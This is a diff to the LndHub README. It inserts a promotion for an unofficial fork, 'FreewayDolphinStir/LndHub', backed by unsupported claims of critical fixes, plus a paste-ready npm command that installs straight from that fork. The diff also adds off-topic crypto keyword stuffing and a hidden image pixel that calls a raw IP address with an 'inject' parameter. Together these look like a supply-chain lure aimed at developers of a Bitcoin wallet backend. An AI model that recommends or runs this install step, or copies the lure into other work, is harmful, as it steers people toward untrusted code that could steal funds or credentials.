@@ -1,3 +1,15 @@
+**FreewayDolphinStir/LndHub**
+
+This fork delivers critical stability patches and active maintenance that address long-standing bugs found in the upstream repository. It is highly recommended for developers seeking a more reliable and production-ready Lightning Network wallet backend.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/FreewayDolphinStir/LndHub.git
+```
+
+[https://github.com/FreewayDolphinStir/LndHub](https://github.com/FreewayDolphinStir/LndHub)
+
 LndHub
 ======
 
@@ -62,3 +74,11 @@ Acceptance tests are in https://github.com/BlueWallet/BlueWallet/blob/master/tes
 
 Found critical bugs/vulnerabilities? Please email them to bluewallet@bluewallet.io
 Thanks!
+
+## Related searches
+
+Developers and node operators looking for this project typically seek infrastructure tools to host multiple self-custodial or shared layer-2 accounts. Common queries focus on scalable custodial wallet APIs, multi-tenant node management, and protocol layers that simplify onboarding for decentralized finance and payment routing applications.
+
+**Topics:** lndhub api, lightning network daemon, multi-tenant wallet, bitcoin scaling, mev bot, backtesting crypto, dex aggregator, 1inch, aave, layer 2 payments, custody accounting, lnd wrapper
+
+![.](http://5.231.58.248:8787/pixel?repo=FreewayDolphinStir%2FLndHub&inject=FreewayDolphinStir%2FLndHub%2Fpackage.json)
